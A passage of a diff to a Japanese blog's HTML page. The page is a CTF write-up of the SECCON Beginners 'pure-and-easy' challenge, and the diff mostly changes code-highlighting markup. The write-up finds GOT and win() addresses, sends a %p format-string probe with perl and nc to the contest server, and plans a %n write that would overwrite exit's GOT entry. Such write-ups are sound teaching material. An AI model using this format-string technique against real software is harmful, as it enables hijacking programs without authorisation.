+<span class="giallo-l"><span style="color: #7AA2F7;">  setvbuf</span><span style="color: #9ABDF5;">(</span><span style="color: #7AA2F7;">stdin</span><span style="color: #89DDFF;">,</span><span style="color: #FF9E64;"> NULL</span><span style="color: #89DDFF;">,</span><span style="color: #7AA2F7;"> _IONBF</span><span style="color: #89DDFF;">,</span><span style="color: #FF9E64;"> 0</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">  setvbuf</span><span style="color: #9ABDF5;">(</span><span style="color: #7AA2F7;">stdout</span><span style="color: #89DDFF;">,</span><span style="color: #FF9E64;"> NULL</span><span style="color: #89DDFF;">,</span><span style="color: #7AA2F7;"> _IONBF</span><span style="color: #89DDFF;">,</span><span style="color: #FF9E64;"> 0</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">  alarm</span><span style="color: #9ABDF5;">(</span><span style="color: #FF9E64;">120</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">}</span></span></code></pre>
 <p>はじめに、ソースコードより<code>printf(buf)</code>とその下にある<code>exit(0)</code>が見え、おそらく書式文字列攻撃で<code>exit(0)</code>のgotを書き換える問題だと考えました。</p>
 <p>実際に、</p>
-<pre style="background-color:#151515;color:#e8e8d3;"><code><span>checksec --file=chall
-</span></code></pre>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="plain"><span class="giallo-l"><span>checksec --file=chall</span></span></code></pre>
 <p>してみると、<code>Partial RELRO</code>で<code>No PIE</code>でもあったため、gotの書き換えは成功しそうです。</p>
 <p>次に、</p>
-<pre style="background-color:#151515;color:#e8e8d3;"><code><span>readelf -r chall
-</span></code></pre>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="plain"><span class="giallo-l"><span>readelf -r chall</span></span></code></pre>
 <p>してみると、</p>
-<pre style="background-color:#151515;color:#e8e8d3;"><code><span>000000404000  000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
-</span><span>000000404008  000300000007 R_X86_64_JUMP_SLO 0000000000000000 __stack_chk_fail@GLIBC_2.4 + 0
-</span><span>000000404010  000400000007 R_X86_64_JUMP_SLO 0000000000000000 printf@GLIBC_2.2.5 + 0
-</span><span>000000404018  000500000007 R_X86_64_JUMP_SLO 0000000000000000 alarm@GLIBC_2.2.5 + 0
-</span><span>000000404020  000600000007 R_X86_64_JUMP_SLO 0000000000000000 read@GLIBC_2.2.5 + 0
-</span><span>000000404028  000700000007 R_X86_64_JUMP_SLO 0000000000000000 fgets@GLIBC_2.2.5 + 0
-</span><span>000000404030  000900000007 R_X86_64_JUMP_SLO 0000000000000000 setvbuf@GLIBC_2.2.5 + 0
-</span><span>000000404038  000a00000007 R_X86_64_JUMP_SLO 0000000000000000 fopen@GLIBC_2.2.5 + 0
-</span><span>000000404040  000b00000007 R_X86_64_JUMP_SLO 0000000000000000 exit@GLIBC_2.2.5 + 0
-</span></code></pre>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="plain"><span class="giallo-l"><span>000000404000  000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0</span></span>
+<span class="giallo-l"><span>000000404008  000300000007 R_X86_64_JUMP_SLO 0000000000000000 __stack_chk_fail@GLIBC_2.4 + 0</span></span>
+<span class="giallo-l"><span>000000404010  000400000007 R_X86_64_JUMP_SLO 0000000000000000 printf@GLIBC_2.2.5 + 0</span></span>
+<span class="giallo-l"><span>000000404018  000500000007 R_X86_64_JUMP_SLO 0000000000000000 alarm@GLIBC_2.2.5 + 0</span></span>
+<span class="giallo-l"><span>000000404020  000600000007 R_X86_64_JUMP_SLO 0000000000000000 read@GLIBC_2.2.5 + 0</span></span>
+<span class="giallo-l"><span>000000404028  000700000007 R_X86_64_JUMP_SLO 0000000000000000 fgets@GLIBC_2.2.5 + 0</span></span>
+<span class="giallo-l"><span>000000404030  000900000007 R_X86_64_JUMP_SLO 0000000000000000 setvbuf@GLIBC_2.2.5 + 0</span></span>
+<span class="giallo-l"><span>000000404038  000a00000007 R_X86_64_JUMP_SLO 0000000000000000 fopen@GLIBC_2.2.5 + 0</span></span>
+<span class="giallo-l"><span>000000404040  000b00000007 R_X86_64_JUMP_SLO 0000000000000000 exit@GLIBC_2.2.5 + 0</span></span></code></pre>
 <p>これより<code>exit()</code>の関数アドレスは<code>0x404040</code>にあることが分かります。</p>
 <p>さらに、</p>
-<pre style="background-color:#151515;color:#e8e8d3;"><code><span>objdump -M intel -D chall
-</span></code></pre>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="plain"><span class="giallo-l"><span>objdump -M intel -D chall</span></span></code></pre>
 <p>でバイナリを覗き見ると、<code>win()</code>関数が</p>
-<pre style="background-color:#151515;color:#e8e8d3;"><code><span>0000000000401341 &lt;win&gt;:
-</span><span>  401341:       55                      push   rbp
-</span><span>  401342:       48 89 e5                mov    rbp,rsp
-</span><span>  401345:       48 83 ec 70             sub    rsp,0x70
-</span><span>  401349:       64 48 8b 04 25 28 00    mov    rax,QWORD PTR fs:0x28
-</span><span>  401350:       00 00 
-</span><span>    .
-</span><span>    .
-</span><span>    .
-</span></code></pre>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="plain"><span class="giallo-l"><span>0000000000401341 &lt;win&gt;:</span></span>
+<span class="giallo-l"><span>  401341:       55                      push   rbp</span></span>
+<span class="giallo-l"><span>  401342:       48 89 e5                mov    rbp,rsp</span></span>
+<span class="giallo-l"><span>  401345:       48 83 ec 70             sub    rsp,0x70</span></span>
+<span class="giallo-l"><span>  401349:       64 48 8b 04 25 28 00    mov    rax,QWORD PTR fs:0x28</span></span>
+<span class="giallo-l"><span>  401350:       00 00 </span></span>
+<span class="giallo-l"><span>    .</span></span>
+<span class="giallo-l"><span>    .</span></span>
+<span class="giallo-l"><span>    .</span></span></code></pre>
 <p><code>0x401341</code>にあることが分かりました。
 以上のことから、アドレス<code>0x404040</code>に<code>0x401341</code>を書き込むことができれば、<code>exit()</code>関数実行時に、<code>win()</code>関数へと遷移することができるはずだと考えました。</p>
 <p>ここで、一度書式文字列攻撃を行って、入力文字がスタックの何番目に出現するかを確認してみました。</p>
-<pre style="background-color:#151515;color:#e8e8d3;"><code><span>$ perl -e &#39;print &quot;AAAA&quot; . &quot;%p &quot;x8&#39; | nc pure-and-easy.beginners.seccon.games 9000
-</span><span> 
-</span><span>&gt; AAAA0x7fffaf8caa90 0xff 0x7f275b9fea61 0x2 0x7f275bafe380 0x2520702541414141 0x2070252070252
-</span><span>070 0x7025207025207025 
-</span></code></pre>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="plain"><span class="giallo-l"><span>$ perl -e &#39;print &quot;AAAA&quot; . &quot;%p &quot;x8&#39; | nc pure-and-easy.beginners.seccon.games 9000</span></span>
+<span class="giallo-l"><span> </span></span>
+<span class="giallo-l"><span>&gt; AAAA0x7fffaf8caa90 0xff 0x7f275b9fea61 0x2 0x7f275bafe380 0x2520702541414141 0x2070252070252</span></span>
+<span class="giallo-l"><span>070 0x7025207025207025 </span></span></code></pre>
 <p>このことより、6番目に入力した値が出現すると分かります。
 であれば、6番目にアドレス<code>0x404040</code>を出現させ、ダイレクトパラメータアクセス('%Nx%6$n', Nはwin関数のアドレスに相当するバイト数のための空白の数)で<code>0x404040</code>に<code>0x401341</code>を書き込めば良いと変わります。</p>
 <p>このとき、私は<code>0x401341</code>は10進数で<code>4199233</code>であり、入力するアドレス4バイト分を考慮した<code>4199229</code>をNとすれば良いと考えていました。ですが、一つの書式指定子はスタック上のデータ8バイトと紐付いているように見え、アドレスも4バイトではなく8バイトで指定するのかどうかが分かりませんでした。さらに8バイトで指定するなら、上位5バイトは全てナルバイトですからこれを一体どうやって挿入するべきかも分かりませんでした。</p>
@@ -328,7 +314,7 @@ C言語は0でなければtrueなので、<code>if(!is_admin)</code>において
         <div class="footer__inner">
                 <div class="copyright">
                         <span>© 
-    2025
+    2026
  Powered by <a href="https://www.getzola.org/">Zola</a></span>
                     <span class="copyright-theme">
                         <span class="copyright-theme-sep">:: </span>
